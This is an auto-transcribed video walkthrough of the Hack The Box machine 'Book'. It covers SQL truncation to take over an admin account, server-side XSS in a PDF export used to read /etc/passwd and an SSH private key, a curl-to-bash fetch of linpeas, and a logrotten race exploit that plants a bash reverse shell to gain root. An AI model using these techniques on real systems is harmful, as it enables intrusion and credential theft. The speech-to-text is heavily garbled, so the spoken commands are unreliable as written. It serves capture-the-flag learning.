 what's going on YouTube the Zips I condone book from hack the box which was difficult because it looked and behaved like a webpage which sounds weird to say but it just didn't put the vulnerability up on a platter for you to go to find an exploit no it was a website that had quite a bit of functionality a lot of forms for you to go play with so with that being said I didn't spend too much time preparing because I want to kind of show the type of things I do to try to look for what may be wrong bullying kind of poke and prod at each thing and then also struggle when actually finding the exploit so with all that being said let's just jump in and do this box as always we're gonna start off the end map so - SC for default scripts as V enumerate versions Oh a up at all formats put in the end map directory and call it book and then the IP address 10 10 10 176 and I always like running and map with sudo so we'll put that there and I was did it mean to actually write it I was gonna say this takes some time to run so well I've already ran it and we look into the file but since I just ran it there and it didn't take too long let's just go over the results so we have SSH on 422 in HTTP on port 80 both of these banners tell us it's on a bun - box except with the HTTP check we have an additional script the HTTP - cookie Flags and map script telling us that it got the cookie PHP session ID so we know this is most likely a PHP web app based upon that cookie going over to the page at 10 10 10 176 we get a just login prompt I'm gonna send this over to actually before I do let's just try a username that doesn't exist like Route at exit rocks and put the password as please subscribe temp to log in and we just get nope what I was trying to find out is if it would tell us username not valid and see if we could find a way to enumerate user names didn't do that so let us just try sending this over to burp and we'll try it's basic sequel injection o intercept is off so do this again send this over to the repeater tab look at it the result is just a thing that says nope so put a single quote put a double quote put some symbols to see if we can induce some type of error message can't do it in the password we can try it and the username doesn't look like we can the next thing I would recommend is doing some type of recon in the background so we can copy this to a file and put this in htb book and we'll call this login dot or a cube for request and we can run sequel map - are on that login request so we probably should also add the - - batch so it doesn't ask us any questions so with us testing for a sequel injection in the background we are now free to go to the signup page and see what is here so in one's name email and password so we'll do name it set and then the password would be please subscribe enter and then I'm also going to do sign up again because I want to see if it will tell us email exists or something and it should user exist so we got user exists when we duplicated the name so let's do a different name like please like this video same email and we'll put a password user exists so it's saying that the email address is the username now can we change V use the same username but have a different email so instead of epic rocks we'll just do maybe user at the protect rocks so we can duplicate user names we can't duplicate emails so I'm going to hit alt f2 to bring up this little prompt and run Cherrytree whoops open this and we'll take notes ctrl n to create a new node call it book and then ctrl shift and to create a child node and this will be sign up and say username is not required to be unique what email is so now we just have that in the back of our mind and we can login with the credentials we created to get to a page so it looks like we have an image and a few links we can go to and a navigation bar for user so let's open up each of these and take a look at what we can do so right off the bat we have library and I'm going to look at the URL this image goes to and it looks like it's going to a download page as we can see at the bottom left it says download quest Mike file equals one so let's open this up and rip sweet open the image in a new tab and then go over to proxy this is the login request we can draw you don't need that send the download to a tab we can rename these so login and this will be image download sending this we just get a bunch of junk this is probably going to be just binary data of a image so let's try a single quote a single quote and a comment we get bad requests because this needs to be URL encoded nothing just a comment nothing nothing maybe one plus one and we don't get anything so if we do one plus one that is the same thing as not putting something valid and the reason why I had done that was if we got a different image here it so it's probably doing some type of evil because it did the math between 1+1 so I don't really know exactly what is here but we can just do control shift and this is the what page was it the books page oops I'm just gonna do notes and we'll say download dot PHP does not appear to be injectable so we can move on and this is a lot of functionality in this site now that I'm looking at it because once we're on books we have a search and a feedback so we go back to books to search an author and by search like corpse and then do the same exact thing we did before try put a comment to see if we get anything and nothing so feedback I'm just going to do image source equals HTTP 1010 14 - please sub JPEG and then what we're going to do is host this on at HTML server to make sure my HTML is fine this sequel map on login didn't return anything so make the dub dub dub beat sh t ml paste that we probably need like test and /i Python 3 - M HTTP server no matter how silly simple the code is always recommend doing a test and pseudo MC LVN p80 click on this page and it's making a request to a box on please subscribe so this is just going to test for some type of basic like XSS attack cross-site scripting so let's go back here cat test out HTML and we'll just paste this wherever there's like a input form and we should see if we get any hits back nothing there book title collection doesn't have any additional things so do the same exact thing browse let's go htb book dub dub dub and even send it the HTML so upload this thanks for the submission looking back here waiting it doesn't look like we have anything so we looked at books search feedback and collection so we should take a note sent payloads to I could actually remember when I talked search feedback feedback collections feedback collections contact us and search does not appear to be objectable I probably should just say does not appear to be injectable and put the scripts just so we know exactly kind of what we've tested so let's go back but this is a message to the admin send and also on this Contact Us page we have admin at book htb so let's go here contact us leaks username admin at HEB so still not getting any hits back we've done a lot of this basic thing we do have a view profile I'm going to put like a single quote let's actually do like old username and we'll put a single quote update and we see it didn't do what I expected I mean it kind of stopped truncating right here but just a bunch of a's afterwards to see if it updates and it looks like there may be of max characters on username right now or something because it's not displaying anything after let's see that go - n WC - see looks like it's not displaying anything after like 10 characters or after 9 so that is a little bit unique we couldn't get rid of or before we get rid of the HTML let's view the source sir check for EPS ACK and we can see they are doing HTML any encoding this is the less than and I should make that bigger less than and greater than and this is the way you encode it to make it not cross state scriptable so since they have cross-site scripting protection in the username itself I'm guessing they have it elsewhere in this so I'm going to stop using cross-site scripting payloads going to settings dot PHP there's nothing here so we go all the way back we did have a way to duplicate user names so I'm gonna try registering the user admin and then using a email and seeing if we can get the roll to say admin so let's go do that clean up our tabs and go to sign up name admin and email we'll do please subscribe at it's a Crocs and the password I'm just doing password cuz I'm getting tight tired of typing signup paste password wait what Dad miss type password and then we'll just do that and password that is definitely the word password so there we go we logged in going back to contact us whoa we wanted to go to view profile we are still just a user but a name is admin I suppose we could just editor a name to be admin before so we don't have anything there but let's revisit the like please subscribe thing so I'm going to copy the email I used previously let me go sign up again so upset put the password and say password sign up and I think maybe I just miss typed something because it did not say email exists but still can't login let's go to sign up name hips ACK password and this time I'm just going to do what we did before and prevent any typos by using copy and paste so going back here sign in and it just really doesn't like that email address so we viewed the source and this piece is a little silly but if you played with it you may have found out let's see where is the JavaScript around name I'm guessing it's something around here please fill email field should not be more than 20 characters so let's see how many characters please subscribe a tip set-top boxes maybe that's what is causing this 28 characters so this JavaScript doesn't look like it was firing but it shouldn't be more than 20 let us go back to the login and just do 20 characters so we copy let's see that would be subtracting 5 6 right here maybe echo - n WC - see there we go 20 characters I passed the counting test so we'll just try this and login with password and we can it says sign in as admin because that's the name we had created but it is still a user so the maximum number of characters is 20 characters on email so let's see if we can override a the email for admin at both HDB so let's do sign up and we're going to do the name I guess we can do it SEC then we'll do admin at full HD B and let's actually just see how many characters this is it's 14 so we are going to add 6 characters so we'll just count 1 through 6 and then we'll do a 7th for good measure all right let's do spaces 1 2 3 4 5 6 my 7th will be 1 so let's use this email copy and then the password will be password it wants us to enter a valid email address and whenever you get like a error instantly on a webpage that's just because it is JavaScript so let us send this over to burp and manually input it so going to burp let's clear the cache of interception sign-up send to repeater and we should just copy this and paste highlight control you to URL encode send the request and we get a 302 found so let's try logging in with this now so let's turn intercept off go to sign in log in with admin at book htb and a password of password and we get in we are signed in as if sec is that's what we put a username and we are still just the role of user so nothing really happened but we do see the username to and from is admin netbook htb and I'm looking at this it does to have spaces after our name so let's try is flesh and exists it does generally if you're in go bust you would have definitely found slash admin so we can do root a tip SEC rocks the password of please subscribe we get nope if we try admin at did I typo that I did boot HDB I did do boot HDB uh let's go try the sign-in thing again book htb send we still get a 302 found so let's try logging in with admin at book HDB and the password of password we get nope we can try logging in with the spaces so copy this password once a valid email we'll just go again - well I guess stop copying from here that's where the typo is there we go okay that's better let's just sign in and may only send this going back to poop suite that's a post this one should be logging in sent to repeater actually may not want to send to repeater yeah won't matter based we get nope let's do get rid of that one so this is exactly 20 characters and it's not letting us login so let's go back to this and Men At book HT be xx care to do one let's see a minute book htb password a password and we are signed in as a user still but an email is admin at book htb if we go to slash admin let's try logging into this one and we can actually log into this pane so what I'm going to do because I don't know exactly what requests did it I'm going to revert the box and we're going to do this one step again to see exactly what happened and then once we go into the root I mean after root section will analyze exactly what the stack is because this is behaving weird the box is reverted so let's go over what we know so we know email is 20 character max so after 20 characters you can do what's called a SQL truncation attack in this case so let's do ABC at 1 2 3 dot-com and that will be I want to say 11 characters echo - n WC - C 11 characters so that's character 12 13 14 15 16 17 18 19 20 so this should be 20 characters so when we register an account like this what actually happens is it registers this it drops off that very last character and if we put a bunch of spaces the reason why I chose spaces I don't know if that's actually 20 I'm not sure if this is like obeying whatnot but visually you put a bunch of spaces here it drops this 0 and registers this and we keep mine this is a blank space I've just put this there for visualization so if it registers just ABC at 1 2 3 calm and a bunch of spaces there's a chance that ABC at 1 2 3 dot-com is equal to ABC at 1 2 3 calm space space space so that's kind of what I'm playing with and testing right so let's go back and register this now that we've kind of explained that we can just test this so please subscribe this was well we never were able to log into with that one that's how we found out about the truncation just try login with root a tip SEC rocks with please subscribe and we get nope so let's go over to 10 10 10 176 slash admin and we're gonna try logging in with admin at booked not boot with a password of password and we get nope so that's good let's just go to 10 10 10 176 and we're going to register the account admin at book HDB and keep mind plus and HTML is URL encoded for space so this should be the same as just doing spaces and Manette book HDB this is probably 20 characters if I had to guess let's do a Kardashian I hope that wasn't sensitive WC - see 20 characters I'm gonna pause the video and see what that base 64 was at some point I must have just like had burp automatically base64 and copy to clipboard because that's what that basics tea for my clipboard was wasn't sure if I had like just some remnants of what I was doing for the video so that's why I wanted to check it while I wasn't recording that was I don't know what happened there but we do have admin at both HD be equal to twenty characters so let's do 20 let's register that first so let's register this one this is post to index this is probably sign up so what's register admin at book HDB we'll do it with 19 characters and we get user exist so we'll do 21 characters we get it is found echo - n WC - see that is 21 characters so now let's try logging in with admin at book HDB password a password we don't get in let's go over to the admin page does this behave differently and then at book HDB password of password we don't get in so let's go and do 20 characters exactly user exists another space so and then at book HT be password let's just intercept this so you can try a bunch of things and what i should also do is once we do that I want to Bureau encode the @ sign okay this is login admin ok let's do your Ellen code that at sign one admin at book HTP and we can log in so the issue there was your link coding that at sign I'll be curious what happens when we root this box and look in the database and see what that did but going here logging in with admin and password we get in so what I want to do is let's just intercept a request and look at the cookies I want to see why logging in with the slash admin is different than logging in with not the slash admin so get admin home dot PHP we just get this PHP session cookie so upon logging in to slash admin the session on the server gets set to admin equals true or something probably if we log down and just logged in at the main one whoops at the main one admin at book HB password a password I guess there could also be something resetting the account so let's try this real quick and then at book htb so and then at both HDB yeah so it's not your own coding it was just a cron job on the server that is preventing us from or that resets the account every like min or something we just hit at that time but looking at this we can see we have told user but of course if we logged in with admin this one is different so let's go back and cherry tree I'm gonna do control shift and post video Explorer and then index dot PHP login function PHP session cookies and SQL truncation so that's what we're gonna look into once we figure out the vulnerability this box and pop it going to users we can see what users are on the box test Shawn Hort and Peter messages feedback collections so let's go back and look at all that cross-site scripting stuff we did before unfortunately we'll have to redo this so the username let's go to register and we'll just do root set Brock's password collections and oh there's gonna be a pain right now this browser magic I do not realize I could have two tabs have a different PHP session cookie weird but okay let's go back copy this and we're gonna paste this everywhere so let's go to books we can't paste it there break and pasting the feedback for a book you get an image collections you get an image you get a third image actually and for feedback you get an image so now we can actually see if it's doing HTML any encoding everywhere so looking at this we do see it there instead of doing control you to view source we could also just look at the element like this and maybe that's not a good way to do it please sub yeah so in the developer tools it actually doesn't show you the HTML and coded form that's funny but we can see me doing it there so nothing too crazy there is a delete function and we could potentially find SQL injection here same thing with this everything on feedback will stick it supports the weeding but no what is it called I'm trying to think of the word cross-site scripting and feedback let's download these PDFs to see exactly what this is save save and let's go places just go home downloads and I don't know what we just downloaded let's look at downloads nine nine and two one for the top two so look at this collection data we get links so we know the directory Docs and it's slash the number dot PDF ok so look at users and we get just the thing that says user data so we could test for let's see what would happen if we go view profile put HTML here update that's annoying go back to users save open and we can see it actually processed that so this is some probably weird tool that will process JavaScript and create a PDF or something because we actually got the PDF itself to have JavaScript the issue right now is the user name was limited to 10 characters and the email was limited to 20 so we can't put a big payload there so let's go take a look at this collections a bit for I think that was this one Mel you so we have to figure out how to create a collection because if we can edit one of these fields and they don't have a length on how big it is that would be a better spot to put some type of JavaScript payload and let's see go users home collections test test test out HTML let's go back here down the collections to see if we get one that has tests in the name it does and looking at this nothing happens going to end map we don't have it actually hitting us but maybe when he creates the PDF it can't do that so let's try putting a JavaScript thing to read a file and we'll see what happens there so let's go to Google and search JavaScript read file or read local file so a Stack Overflow link or something it's stacked overflow how to read a local text file going through for input linking just for an easy one to use let's go back and instead of Stack Overflow I'm going to do file colon slash slash Etsy passwd because that's a common proof of concept for doing shady things and that's exactly what we want Oh server-side XSS dynamic PDF on book actrix dot X Y Z so this should be a good one to do maybe here we go this looks like it should work so let's go back here book title test we can leave that there upload I should have done something other than test collections download save file and we got something I don't know if that's what we want was that page sixty Ford echo dash n base 64 dash D it is okay I guess I didn't read the payload all the way ah B to a so yeah it is doing a base 64 so let's see CP downloads eight one one see do we have a PDF to HTML I looking for like PDF to text or something but if we convert the Pope there is PDF to text and then eight one LS cat eight one one six three dot txt and looks like I mean didn't grab the whole thing which is weird grabbed a max of so many characters so let's go back to this payload so anything that says only grabs certain number of characters document right no so let's try putting it somewhere else get rid of this tab ABC ABC we'll put it in the actual uploaded piece see dub dub V J s copy-paste browse J s upload and we can download again open link goes to this PDF and it wants us to find book DB so let's just sudo VI Etsy host 10-10-10 dot 176 HDB PDF is like linking inception right now ducks do 10-10-10 176 PDF might not be displayed correctly unable to open document w get last 377 for PDF and it's literally just our JavaScript so nothing happened there we could try putting some PHP code so test ABC ABC V test dot PHP PHP echo Who am I and that's not actually learn the command that's just going to print Who am I because I'm lazy but as long as you know what the behavior should be should be able to test it so let's upload that then we have to export the collections download the PDF get the new link and we'll see if it actually processes H PHP code here's that copy link address I guess we should download this less to eight it's not processing the PHP code so let's go back to our payload and we'll put this and the author field okay go back to collections save file nothing so I'm going to get rid of this base64 thing so let's come to cherry tree and let's get rid of B to a test doesn't matter what we put save that and we get the whole thing so that's good let's try grabbing something to see who we are on this box so if I do cat Pronk self and vayan see grant if SEC just gonna highlight this yeah so let's try driving the environment copy this file copy paste okay download save file open well you're still grabbing the previous one so I'm gonna give it a minute and see if it cleans itself up and then we will do this thing again let's try this again the author will be we'll call it thanks for waiting browse upload download wait for it to download and I just do open with and we didn't get a single thing so let's try this again thanks upload download open unable to open well at least that's a good sign let's download this save and now watch me be too late and whatnot I'm actually so zero bytes so it appears it can't read that one file the proc self and Bayern and a lot of the files M proc self are actually like it's a weird file structure it doesn't have a like file end because they're auto-generated I believe or something weird I found out about it when I was doing the Rope video and I think there's a header called range that if we set this header and a request we maybe will actually pull the file I don't know so let's try this XML request header what is it XML HTTP request set header see okay set request header header and value so we can try X dot header set request header is what we want X dot set request header and we want range because that's the rate of the header we want and we want the value to be bytes equals 0 to 48 96 that's just a random size we can do like probably 256 if we wanted that just grabbed 4096 bytes so let's try this payload I'm curious if this works and if we even did this correctly so doing here putting something uploading it downloading the collection just going to save the file and then we can open it and we don't get the file but at least it didn't crash on us so we can try a different thing and proc self and then we'll move on proc self see what is there CWD would be a current working directory we don't definitely don't want that maps that's not gonna give us a username we want something that give user name or information matter process and I honestly don't really see anything but we can go into the proc table and maybe grab let's see should be one schedule debug does this say usernames running things head less PID switches I don't see that's the process ID but I don't see anything specifying what user so not sure let's grab at see passwd to make sure we didn't break a javascript by doing this header thing and if this works then we're just gonna guess at users because I'm honestly not show otherwise what to do and I am sick of doing this 50 times oh come on it sure went to birth now watch this one's gonna get a broke nope okay let's just download it save file so I think maybe we broke something with that set headers X dot set request outer range so you may want to do more playing around with that fast WD based save file so we can get this and we can look at all the users and the only real user that doesn't have that has another bin bash for a shell his home reader so let's just do a shot in the dark and see if we can include his SSH key so going back here file home reader SSH ID RSA let's try this home reader SSH I just made it bigger because I saw this - and that just means it's going to the next line so that's I was testing there so let's do book title put something upload/download save and we get an SSH key so copy that let's clean up all of these open windows I hate dealing with PDFs if you can't tell but that's clean we don't need this open anymore okay so V key paste sage mod 680 reader at 10-10-10 176 and it says key is in the invalid format and if we look at key SH Keys generally have a set number of characters per line I think it's just because of how the PDF was that it's not like that so let's try going into downloads and what's the most recent file grab 11 let's probably grab 11 a way to sort by file time I think it's this three five five nine so PDF to text this one last three five five dot txt and that may have done an even worse job of topping it out let's try text PDF to HTML PDF less page let's just copy this into a different directory because that does something weird three five five nine nine PDF to HDB book MV PDF or make the PDF MV 3 5 5 into PDF and then PDF to HTML because it created a few files 3 5 5 9 s HTML that's looking better less three five five nine nine dot HTML okay so we definitely want the three that one that has s in it so let's just copy this the key paste I'm going to do percent s and then BR / with backslash backslash N and let's get rid of maybe was it only needed backslash n what backslash R I only need one of those characters but that key is looking much better I don't like all this weird encoding I'm gonna cat the key we're just going to grab this go up one directory look at this key and paste the contents so now if I do that same SSH - I command to use this key we get in so that was a easy way to fix the formatting there's one thing I'm curious about now let's go back into places downloads and find this b64 thing we had done so htb book oh no we want to downloads there's one with base64 not you not you this yeah I want to do this to PDF it up to HTML we did text before and it didn't really grab that much but it looks like the PDF Converter the HTML converter is much better so we'll paste 8-1 CD PDF PDF to HTML eight one less s and that grab the whole base64 so if you're using a PDF converter lesson learned use PDF to HTML because it is much better it's not getting us the equal sign but we can guess the padding and get rid of that error message so that is a much better way to grab the files all that being said we do have a shell on the box so let's do reader at 10 10 10 1 76 doing LS we do have a backup directory looking at it we have just accessed log LS la access log 1 and we just see a single git command so I'm gonna do SS s SS - Oh NPT to see listening ports and we just have SQL and 80 the reason why I did that was I don't know what Robbie Oh 3 is it is a 404 but I was just saying if there was a extra web server I wasn't accounting for so let's do up privilege escalation script awesome sweet just looking for where it is Lynn peas and we'll copy this to dub dub dub HDB book dub dub dub go into that directory and now we can run Lynn peas so curled 10 10 14 - 4 8000 Glen pssh favorite of the bash and once this finishes we will look at the results and see if there's any easy prevx when piece is finished so let's go over their results let's see system information pseudo environment I'm just going for anything that is like red so we have root processes that's not too interesting cron jobs not too interesting dot service files so we can look at settings.php it's highlighting this one so let's just paste that here whoops I don't know why I did that settings dot PHP don't see anything really last logins Drupal settings specifically I'm looking for something in this backup directory because that is weird that there is here writable log file log rotten limit 100 you can write more log files inside last directory so because this is not system standard and on the box I'm extremely interested in that look through the other thing to see if there's anything like red with a yellow background and I don't really see anything we should go over that more in-depth but it was quite a bit information the first thing I look at is this settings.php it's including DB PHP so let's go for dub dub dub HTML les DB PHP and the password is I hate book reading for the sequel database so I'm just going to copy this out order 10 notes and let's go on to look at the log rotten so there's a vulnerability in log rotate that allows a user with the write permission over log file or any of its parent directories to make log rotate write a file and any locate any location they write it in Etsy bash completion D because that gets executed upon login so if we write in this directory it only executes upon login I'm gonna run the command last to see last logins and whole god we can see root logging in constantly like multiple times in a minute so I'm guessing it's probably something around this just based upon the scenario of them saying usually all right any bra it'll be executed when a user logs in and you look and there's some type of script making route login constantly we could do head to show it's logging in currently as well so let's see more information go here do we have a POC script there we go so here they're kind of explaining what's happening so let's see if we can explain this so roots going to execute a stat on this file to see if it exists and then it's gonna say yep that exists and then we're going to rename the directory that file exists and then do a symlink to the bash completion directory and it's going to create the log file and copy it into where that sim link is so essentially yeah so it's looking at Temple ogz and it says yep the file exists we need to rotate it so what log rotate does is it would take this file log and do file one dot log and it's essentially issuing a move command so it's doing move temp logs file dot log to be easy if we type this so essentially what it's doing is doing move temp log slash file to temp log slash file 1 or file 2 but before it does that it does hey does temp log file need to be moved if the answer is yes it goes ok let me grab temp log file and it grabs temp log file here so it can say file is equal to that let's just say that and what we do here is we move attacker does move temp log to temp blog dot back and then says ok temp blog is now Etsy bash completion if I did that same link wrong but essentially you are overwriting this to be directory attacker wants and it's doing like echo file to essentially that's what's happening because you're overtaking the directory log rotate is working with so it's a race condition between it reading the file and then copying the file or rolling the file hopefully that makes sense and hopefully I understood the attack correctly but let's copy this get clone which GCC we do have GCC on here so we can compile this so let's do Python again dev SH M W get 1010 14 to 8 thousand log rotten dot C GCC to compile and - so is output file so now we have the script so let's take a look at exactly what this does do we have syntax highlighting here we do let's see so this is just a infinite loop while one and payload file target directory these are arguments and then they also have defaults so if we search this and go up we can see target directory is defined as Etsy bash completion so that's not a required argument but if we want to change where the file writes to we do that - P is the file so follow that contains the payload so we'll want to probably put a reverse shell in this and then the final thing is the log file that's to be rotated that's doing the case where is the start of what we're doing there's a lot of code here come on anybody just search for inotify okay so this is creating a file descriptor for inotify essentially think of this as a hook into the file system to see when a file is being accessed so if for some reason we can't access the inotify subsystem it's going to air out so why Oh infinite loop length is equal to read and then if I notify is saying anything here's the event it's renaming the log to be that log dot back it's doing that symbolic link the target directory this is bash completion to log path so right here is the step of taking control of Templar and our example and then it writes the payload so horrible explanation that I don't know well I attempted doing that reading C code that I haven't looked at before live is painful so let's do V test dot sh and we'll do bin bash bash - I dev TCP 1010 14 to 0 at and one NCL VMP 9001 I don't think I said 9001 I do not plan doesn't one this is why you always test scripts before running them reverse shell does work so here now we can do log rotten let's see - peep a load test SH and then the log is a var not VAR log home reader backups access log and before I do this I'm going to run a command that tells access log to rotate so if we do it LS in this directory we can see access log already rotated once so whatever this file is it met the prereqs to rotate which is probably file size so I'm just going to copy home reader backups that log to home reader backups access log n CL v + p9 thousand one so right here making sure that when log rotate runs it copies the log and right here it's doing the attack so it renamed it looks like it did the attack but we don't have a shell can we go into this Etsy bash completion dot d directory we can and we don't see a file so OS Etsy bash completion dot d doing this again and we see the file is there and weak at it and it looks to be fine C SSH reader and it works so I think we're just waiting on route to log in at this point and we do have a login and we can do WCC root text and grab that file um the login does die relatively quickly so we probably just have to spawn a new process I wonder if we can just do it by executing bash again be test on Sh let's just do it again and this time we'll just execute a another shell so waiting for this to run got access slog can't test our sh much oh I know oh shoot that mine don't have time copy won't ran that time do the exploit again so that's the payload if we do know huh it should throw it in the background so let's do no hump maybe bash see ll be NP I think yeah that should be fine see no hop dev sh m no hop dev sh m test our sh o don't have the RL this is embarrassing this is one of the reasons I hate doing live streams I don't know why don't just pause the video and go on about my day but we'll get this working this time I don't know if that actually worked we got the connection but it never gave a shell got dev as a gem test out of sage okay see if this one stays I honestly have no idea what just happened there but we got the show to stay so we I don't know I'm going to this session we copied the route logged in we got an initial shell here and within like five seconds the initial shell dies so and we tried to spawn a new process of a additional shell to go here this shell died but this one lived did not expect that but now we have a persistent shell here we can make the star SSH oh there is a directory SSH and there is an ID RSA so we can just grab this key and now we'll have root on the box so V root paste chmod 600 is a chai route at 10 10 10 176 so now we have a root shell to this box so I think we did a good job kind of explaining vlog rotten the main things we wanted to go over or let's go over there SQL truncation then PHP session cookies and then this what kind do it in reverse order so let's go find the PHP source code which is probably invertible dub dub HTML and it was in login index top Pete no that's login I think three was sign up yeah this is sign up seeing up sign up always helps to label your tabs so we have name email and password so let's go to index and let's see well right off the bat I see this insert into values so this is probably the signup function and we have if is set post name select email where email get results user exist so the very first thing it does on this signup is it's going to see if the email exists and if number OU's is equal greater than 0 that means the email has already been used and set the location back to index dot PHP if the email hasn't been used let's insert the value and that's it and then if the thing name is not set then it's going here and doing a login so let's see a new point does it say 20 characters so if it's not saying 20 characters here it's probably in the actual my sequel database so I'm going to do show databases use book so tables select star from users and here we have everything it looks like the admins default password is super secure pass but let's create something with a bunch of spaces so let's go back here this sign-up function will do one two three four five six seven zero twice or do it three times now do this again at be calm let's see hey at be calm it's probably because we have this session okay yeah there's that session because we're logged in it just wasn't hitting this piece of code so send this three times and we can see it's only doing it twice after twenty characters everything just gets dropped and what's interesting is it lets us register duplicate things like we should be hitting the duplication check but we never do so by curiosity why does the very first thing what does this fail select email from users where email is equal to this oh so this isn't getting triggered because the value for email right here we're sending the database 30 characters and what's stored in the database is only 20 characters so that's why you can register do get emails this way I bet if we so now the question becomes how is the database actually truncating so if we go into book I think we can say describe users yeah so this is how the database was set up and we can see name is set to 10 and email is set to 20 so since there's a max on this email field when the PHP scripts inserting it the developer probably thinks that oh if I give it 30 characters in the email the database is gonna fail and not do anything when in reality the database is only grabbing the first 20 characters so let's see what happens when we add a well we know what happens only out of space because we saw that behavior but let's do admin at book htb okay now we select star it existed so let's put a 1 at the end and it looks like the database may have actually got rid of the spaces let's see what is a good way to do this as they're a hex oh let's see MySQL convert output to hex your ring strain to hex select my SQL that should worked select X maybe we put hex around the whole thing or a hex email there we go select email hex email send that and we can see in the database it is registering the spaces at the end so now the question becomes why does index dot PHP not account for these spaces so let's go take a look at admin index.php select email password from users ok get result so right here it's checking if email is equal to admin at book HDB and before that for whatever reason it's doing a trim and trim and PHP removes like white space right here so it's removing all the white spaces from email and then saying does email equal admin netbook HDB and that's where this vulnerability is coming from so at least that now makes sense let's look at the PHP session cookie that gets set so let's see get set session start I wonder if home dot PHP actually sets it okay let's do new private window 10 10 10 176 and minute book HT be with the password of one or password a password then if we go admin home dot PHP still wants us to sign in so these things are definitely different let's look at my cookies still only have the one but let's grab this PHP session ID ver Lib PHP sessions it's not where the sessions are stored sit in temp oh let's see fine slash and we'll grab this name to dev null there we go these are where the PHP sessions are this weird systemd container and let's cat this one so you logged in and let's look at what a regular cookie looks like go admin password we get an admin home okay we can't get into admin home so something sets this admin because the initial login page sets the logged in cookie this one set to admin so ver dub-dub-dub HTML wanna do is grep for log 2n and we're going to see if we can find what sets it real quick - v and i just found it um it's saying the session cookie right here this dollar underscore session this is the PHP session that gets created creating logged in and setting it to row email so we can see logged in and email is what is set so if we looked at the other one and admin let's go be index if I just search for session and here it's setting dollar underscore session admin equals row email so that's sending that session cookie for admin it just took me a while to spot because I forgot el PHP handle sessions but that's it so did we answer all the questions we got through that we got through this one because that's doing a truncate so this chunky email that was that oddness that we saw PHP session cookie and Minn sets admin session / sets logged in session and that's why i could be logged in on two tabs because it just appended this piece to the session cookie and then SQL truncation this was database maxi equals 20 cares so hope you guys enjoyed the video take care and I will see you all next week